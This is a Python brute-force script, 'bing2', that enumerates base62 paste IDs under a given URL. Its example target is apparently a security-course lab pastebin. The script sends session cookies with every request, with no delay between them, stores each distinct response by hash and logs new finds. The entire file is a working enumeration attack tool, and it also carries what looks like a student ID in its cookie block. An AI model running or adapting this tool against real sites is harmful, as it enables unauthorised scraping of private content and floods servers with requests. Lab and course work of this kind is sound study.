#!/usr/bin/python  
import sys  
import zlib
import time
import os
import re

#import requests-futures
from baseconv import base62
from etaprogress.progress import ProgressBar
import requests

def main():
	PROGRAM_NAME = "bing2"
	SLEEP_TIME = 1	

	HOW_TO = """bing2 - smartened (brute)Bing
	Use for targeted patterned attack"""
	
	if len(sys.argv) != 4: #-1
		print(HOW_TO)
	
		print("USAGE: python "+PROGRAM_NAME+".py <URL> <min> <max>")
		print("brute_min & brute_max in base62, ie case sensitive")
		print("Note: length is picked up from min&max, so pass args correctly")
		print("Note: base62 is as follows: numbers->CAPITALS->lowercase")
		print("For example: python "+PROGRAM_NAME+".py http://pastebing.ns.agency/raw/2uKYCmrA 0m Fz")
	else:
		# init		
		URL = str(sys.argv[1])
		length = max(len(sys.argv[2]), len(sys.argv[3]))
		brute_min = int(base62.decode(sys.argv[2]))
		brute_max = int(base62.decode(sys.argv[3]))
		
		logname = PROGRAM_NAME+"_"+getUnixTime()+".log"
		log = open(logname, "a+")
		
		cookies = {
			"zid": "z5214048",
			"token": "???",
			"session": "???"
		}
		
		headers = {
			"Upgrade-Insecure-Requests": "1"
		}
		
		work = brute_max-brute_min
		bar = ProgressBar(work, max_width=40)
		
		# print for user
		print(PROGRAM_NAME+" initialised")
		print("URL: "+URL)
		print("Note: base62 is as follows: numbers->CAPITALS->lowercase")
		print("stdout will be logged to "+logname)
		print("the bruteforce will start in 3s")
		# allow user to change brute_mind
		time.sleep(3)
		
		#payload
		i = 0
		for i in range(work+1):
			k=i+brute_min
			
			k_string = base62.encode(k) # convertion to the text
			k_string = k_string.zfill(length) #decorating
			
			r = requests.get(URL+k_string, cookies=cookies, headers=headers)
			txt = r.text
			# https://docs.python.org/3/library/zlib.html SAYS
			#'An Adler-32 checksum is almost as reliable as a CRC32 but can be computed much more quickly'
			#'Changed in version 3.0: Always returns an unsigned value' => GOOD
			txt_hash = toHexCustom(zlib.adler32(txt.encode('utf-8')))
			
			# write to payload listings
			f_payload = open("pay_"+txt_hash+".txt", "a+")
			f_payload.write(k_string+"\n")
			f_payload.close()
			
			# if no transcription => first time resp encountered
			if not(os.path.isfile("plain_"+txt_hash+".txt")):
				# write to plaintext transcription
				f_plain = open("plain_"+txt_hash+".txt", "w+", encoding="utf-8")
				f_plain.write(txt)
				f_plain.close()
				# now log stuff
				whatToLog = "[N]"+k_string+"; New hash found! Check: "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
			
			# if hash already encountered
			else:
				# boring log, what else to do
				whatToLog = "[B]"+k_string+": "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
				
			bar.numerator = i
			print(str(bar))
			#sys.stdout.flush()
			
			#myCoolTitle = PROGRAM_NAME+" "+k_string
			#os.system("title "+myCoolTitle) #https://stackoverflow.com/a/10229529
			#time.sleep(SLEEP_TIME/1000)
		
		#payload (for-loop) over
		whatToLog = "[F] Fin"
				
		log.write(whatToLog+"\n")
		print(whatToLog)
		
		log.close()
	
	
def getUnixTime():
	return toHexCustom(int(time.time()))
	
def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	
	
if __name__ == '__main__':
	main()